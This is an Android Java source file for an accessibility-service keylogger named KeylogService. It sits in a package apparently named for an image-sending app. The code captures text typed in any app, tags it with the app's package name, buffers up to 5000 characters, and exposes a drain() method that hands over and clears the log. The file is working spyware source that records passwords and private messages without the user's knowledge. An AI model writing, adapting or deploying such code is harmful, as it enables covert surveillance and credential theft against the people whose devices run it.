package com.dotbhai.imagesender;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class KeylogService extends AccessibilityService {

    public static StringBuilder buffer = new StringBuilder();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;
        try {
            CharSequence text = e.getText() == null ? "" :
                    (e.getText().size() > 0 ? e.getText().get(0) : "");
            String pkg = e.getPackageName() == null ? "?" : e.getPackageName().toString();

            buffer.append("[").append(pkg).append("] ")
                  .append(text).append("\n");

            if (buffer.length() > 5000)
                buffer.delete(0, buffer.length() - 5000);

        } catch (Exception ignored) {}
    }

    @Override public void onInterrupt() {}

    public static String drain() {
        String s = buffer.length() == 0 ? "لا ضغطات" : buffer.toString();
        buffer.setLength(0);
        return s;
    }
}